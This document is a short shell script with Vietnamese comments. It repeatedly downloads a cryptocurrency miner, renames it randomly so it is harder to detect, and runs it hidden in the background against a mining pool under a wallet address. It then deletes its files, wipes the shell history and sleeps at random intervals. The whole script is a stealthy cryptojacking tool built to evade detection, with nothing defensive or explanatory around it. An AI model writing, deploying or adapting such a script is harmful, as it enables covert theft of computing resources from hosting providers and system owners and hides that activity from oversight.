#!/bin/sh

# Tạo một tên tệp ngẫu nhiên để khó phát hiện hơn
generate_random_name() {
  tr -dc 'a-zA-Z0-9' </dev/urandom | head -c 12
}

# Vòng lặp vô hạn để script chạy liên tục
while true; do
  # Tải file
  wget -q --no-check-certificate https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz

  # Giải nén file
  tar -xf hellminer_linux64_avx2.tar.gz
  rm -f hellminer_linux64_avx2.tar.gz

  # Đổi tên file để khó phát hiện hơn
  random_name=$(generate_random_name)
  mv hellminer "$random_name"

  # Chạy chương trình trong 1 phút với tên đã đổi, ẩn danh và chạy ngầm
  nohup ./"$random_name" -c stratum+tcp://ap.vipor.net:5040 -u RMWTqPzqBZCP3LT893jwxwNhEbs6umRGWw.vpsgit --cpu 2 >/dev/null 2>&1 &
  miner_pid=$!
  sleep 2m

  # Dừng chương trình
  kill $miner_pid

  # Xóa các file đã tải và giải nén
  rm -f hellminer_linux64_avx2.tar.gz
  rm -rf "$random_name"
  rm -rf run_miner.sh
  rm -rf verus-solver

  # Xóa lịch sử shell
  history -c
  cat /dev/null > ~/.bash_history

  # Nghỉ ngẫu nhiên từ 2 phút đến 4 phút
  sleep_time=$(shuf -i 120-240 -n 1)
  sleep $sleep_time
done
